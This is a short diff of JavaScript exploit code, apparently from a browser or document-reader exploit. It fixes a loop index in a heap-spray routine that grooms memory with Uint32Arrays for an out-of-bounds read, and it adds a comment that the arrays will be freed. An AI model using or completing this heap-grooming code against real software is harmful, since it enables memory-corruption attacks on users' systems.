@@ -195,7 +195,9 @@ var spraypos  = 0x0d0f0058;
 
 // force allocations to prepare the heap for the oob read
 for(var i1 = 1; i1 < 0x3000; i1++){
-    a[i] = new Uint32Array(252);
+    a[i1] = new Uint32Array(252);
+
+    // these will be freed
     a1[i1][249] = spraybase;
     a1[i1][250] = spraybase + 0x10000;
 }
